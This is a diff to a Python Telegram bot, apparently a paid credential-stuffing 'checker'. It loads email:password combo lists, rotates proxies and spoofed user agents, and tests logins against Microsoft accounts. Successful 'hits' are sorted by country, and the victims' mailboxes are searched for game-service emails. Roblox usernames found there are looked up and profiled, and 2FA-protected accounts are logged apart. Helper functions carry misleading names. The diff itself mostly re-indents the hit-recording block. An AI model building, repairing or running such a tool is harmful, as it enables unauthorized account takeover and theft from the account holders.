@@ -69,10 +69,8 @@ FLAG_MAP = {
     "CL": "🇨🇱", "CO": "🇨🇴", "PE": "🇵🇪", "EG": "🇪🇬", "BS": "🇧🇸", "HK": "🇭🇰",
 }
 
-
 def get_flag(code):
     return FLAG_MAP.get((code or "").upper(), "🏴")
-
 
 def load_user_proxies(chat_id, content):
     global user_proxies, user_proxy_index
@@ -85,7 +83,6 @@ def load_user_proxies(chat_id, content):
             user_proxies[user_id].append(line)
     return len(user_proxies[user_id])
 
-
 def get_user_proxy(chat_id):
     global user_proxies, user_proxy_index
     user_id = str(chat_id)
@@ -97,7 +94,6 @@ def get_user_proxy(chat_id):
         return proxy
     return None
 
-
 def format_proxy(p):
     if not p:
         return None
@@ -108,7 +104,6 @@ def format_proxy(p):
     if len(parts) == 4:
         return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
     return f"http://{p}"
-
 
 def load_db():
     global keys_db, users_db
@@ -125,7 +120,6 @@ def load_db():
     except:
         users_db = {}
 
-
 def save_db():
     try:
         with open(KEY_FILE, 'w') as f:
@@ -137,7 +131,6 @@ def save_db():
             json.dump(users_db, f, indent=2)
     except:
         pass
-
 
 def get_user_plan(chat_id):
     if str(chat_id) == str(ADMIN_ID):
@@ -162,10 +155,8 @@ def get_user_plan(chat_id):
     save_db()
     return "free"
 
-
 def get_plan_info(plan):
     return PLANS.get(plan, PLANS["free"])
-
 
 def check_daily_reset(chat_id):
     user_id = str(chat_id)
@@ -176,7 +167,6 @@ def check_daily_reset(chat_id):
             users_db[user_id]["daily_used"] = 0
             users_db[user_id]["last_reset"] = today
             save_db()
-
 
 def get_remaining_daily(chat_id):
     check_daily_reset(chat_id)
@@ -189,7 +179,6 @@ def get_remaining_daily(chat_id):
     daily_used = users_db.get(user_id, {}).get("daily_used", 0)
     return daily_limit - daily_used
 
-
 def send_message(chat_id, text, reply_markup=None):
     try:
         data = {"chat_id": chat_id, "text": text}
@@ -199,7 +188,6 @@ def send_message(chat_id, text, reply_markup=None):
     except:
         pass
 
-
 def send_document(chat_id, filepath):
     try:
         with open(filepath, 'rb') as f:
@@ -208,7 +196,6 @@ def send_document(chat_id, filepath):
                           files={"document": (os.path.basename(filepath), f)}, timeout=30)
     except:
         pass
-
 
 def download_file(file_id):
     try:
@@ -222,7 +209,6 @@ def download_file(file_id):
     except:
         return None
 
-
 def generate_key(key_type):
     import secrets, string
     chars = string.ascii_uppercase + string.digits
@@ -232,7 +218,6 @@ def generate_key(key_type):
     keys_db[key] = {"type": key_type, "expires": None, "bound_to": None, "created": datetime.now().isoformat()}
     save_db()
     return key
-
 
 def kerpetennecmi(line):
     line = line.strip()
@@ -245,7 +230,6 @@ def kerpetennecmi(line):
             if email and pwd and "@" in email:
                 return f"{email}:{pwd}"
     return None
-
 
 def cokludosyayukle(dosya_listesi):
     tum_hesaplar = []
@@ -264,7 +248,6 @@ def cokludosyayukle(dosya_listesi):
             pass
     return list(dict.fromkeys(tum_hesaplar))
 
-
 batmanparkyetkilisi = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
@@ -273,10 +256,8 @@ batmanparkyetkilisi = [
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 ]
 
-
 def ataturkparki():
     return random.choice(batmanparkyetkilisi)
-
 
 # ============================================================
 # ROBLOX
@@ -292,7 +273,6 @@ def roblox_gidd(username):
         pass
     return None
 
-
 def roblox_csrf():
     s = requests.Session()
     try:
@@ -300,7 +280,6 @@ def roblox_csrf():
         return r.headers.get("x-csrf-token"), s
     except:
         return None, None
-
 
 def roblox_gsnn(asset_ids):
     if not asset_ids:
@@ -318,7 +297,6 @@ def roblox_gsnn(asset_ids):
     except:
         return []
 
-
 def roblox_eruu(text):
     for pattern in [r'account:\s*([a-zA-Z0-9_]+)', r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
                     r'account:\s*([a-zA-Z0-9_]+)\.', r'for\s+([a-zA-Z0-9_]+)\.\s+If']:
@@ -326,7 +304,6 @@ def roblox_eruu(text):
         if m:
             return m.group(1)
     return None
-
 
 def roblox_rlll(username, proxies=None):
     result = {"username": username, "friends": 0, "banned": "No", "created": "Unknown",
@@ -348,7 +325,6 @@ def roblox_rlll(username, proxies=None):
     except:
         pass
     return result
-
 
 # ============================================================
 # MICROSOFT CHECKER
@@ -806,7 +782,7 @@ def bakim(chat_id):
 
 
 # ============================================================
-# TARAMA — STATE TABANLI
+# TARAMA
 # ============================================================
 
 def tarama_yap(chat_id, accounts, dosya_adi):
@@ -850,59 +826,58 @@ def tarama_yap(chat_id, accounts, dosya_adi):
 
             with lock:
                 if status == "SUCCESS":
-    state["hit"] += 1
-        ulke = (c.country or "Unknown").upper().strip()
-        if not ulke or len(ulke) > 3:
-            ulke = "Unknown"
-        isim = c.name or ""
-        
-        state["ulke_sayaci"][ulke] = state["ulke_sayaci"].get(ulke, 0) + 1
-        state["all_hits_icerik"].append(combo)
-
-        hesap_detaylari = []
-        hesap_keyword_listesi = []
-
-        if mesaj_info:
-            for game_key, m_info in mesaj_info.items():
-                sayi = m_info.get("sayi", 0)
-                if sayi and sayi > 0:
-                    tarih = m_info.get("tarih", "N/A")
-                    subj = m_info.get("subject", "")
-                    prev = m_info.get("preview", "")
-                    state["keyword_sayaci"][game_key] = state["keyword_sayaci"].get(game_key, 0) + 1
-
-                    if game_key == "roblox":
-                        kullanici = roblox_eruu(prev + " " + subj)
-                        if kullanici:
-                            rd = roblox_rlll(kullanici, formatted_proxy)
-                            wearing = ", ".join(rd["wearing"]) if rd["wearing"] else ""
-                            s_detay = (f"🎲 ROBLOX | Username = {rd['username']} | Friends = {rd['friends']} | "
-                                       f"Banned = {rd['banned']} | Created = {rd['created']} | "
-                                       f"Profile = {rd['profile']} | Wearing = [{wearing}]")
-                        else:
-                            s_detay = "🎲 ROBLOX | Username = ???"
-                    else:
-                        lbl = GAME_EMAILS[game_key]["label"]
-                        s_detay = f"{lbl} ({sayi})"
-                        if subj:
-                            s_detay += f" [{subj}]"
+                    state["hit"] += 1
+                    ulke = (c.country or "Unknown").upper().strip()
+                    if not ulke or len(ulke) > 3:
+                        ulke = "Unknown"
+                    isim = c.name or ""
                     
-                    hesap_detaylari.append(s_detay)
-                    hesap_keyword_listesi.append((game_key, s_detay))
+                    state["ulke_sayaci"][ulke] = state["ulke_sayaci"].get(ulke, 0) + 1
+                    state["all_hits_icerik"].append(combo)
 
-        if hesap_detaylari:
-            birlesik_detay = " | ".join(hesap_detaylari)
-            satir = f"{combo} | {ulke} | {isim} | {birlesik_detay}"
-        else:
-            satir = f"{combo} | {ulke} | {isim} | NO MAIL"
+                    hesap_detaylari = []
+                    hesap_keyword_listesi = []
 
-        state["ulke_icerik"].setdefault(ulke, []).append(satir)
+                    if mesaj_info:
+                        for game_key, m_info in mesaj_info.items():
+                            sayi = m_info.get("sayi", 0)
+                            if sayi and sayi > 0:
+                                tarih = m_info.get("tarih", "N/A")
+                                subj = m_info.get("subject", "")
+                                prev = m_info.get("preview", "")
+                                state["keyword_sayaci"][game_key] = state["keyword_sayaci"].get(game_key, 0) + 1
 
-        for k_game, k_detay in hesap_keyword_listesi:
-            k_satir = f"{combo} | {ulke} | {isim} | {k_detay}"
-            state["keyword_icerik"].setdefault(k_game, []).append(k_satir)
-            print(f"[HIT] {k_game} | {ulke} | {combo}", flush=True)
+                                if game_key == "roblox":
+                                    kullanici = roblox_eruu(prev + " " + subj)
+                                    if kullanici:
+                                        rd = roblox_rlll(kullanici, formatted_proxy)
+                                        wearing = ", ".join(rd["wearing"]) if rd["wearing"] else ""
+                                        s_detay = (f"🎲 ROBLOX | Username = {rd['username']} | Friends = {rd['friends']} | "
+                                                   f"Banned = {rd['banned']} | Created = {rd['created']} | "
+                                                   f"Profile = {rd['profile']} | Wearing = [{wearing}]")
+                                    else:
+                                        s_detay = "🎲 ROBLOX | Username = ???"
+                                else:
+                                    lbl = GAME_EMAILS[game_key]["label"]
+                                    s_detay = f"{lbl} ({sayi})"
+                                    if subj:
+                                        s_detay += f" [{subj}]"
+                                
+                                hesap_detaylari.append(s_detay)
+                                hesap_keyword_listesi.append((game_key, s_detay))
 
+                    if hesap_detaylari:
+                        birlesik_detay = " | ".join(hesap_detaylari)
+                        satir = f"{combo} | {ulke} | {isim} | {birlesik_detay}"
+                    else:
+                        satir = f"{combo} | {ulke} | {isim} | NO MAIL"
+
+                    state["ulke_icerik"].setdefault(ulke, []).append(satir)
+
+                    for k_game, k_detay in hesap_keyword_listesi:
+                        k_satir = f"{combo} | {ulke} | {isim} | {k_detay}"
+                        state["keyword_icerik"].setdefault(k_game, []).append(k_satir)
+                        print(f"[HIT] {k_game} | {ulke} | {combo}", flush=True)
                 elif status == "2FA":
                     state["twofa"] += 1
                     state["twofa_icerik"].append(combo)
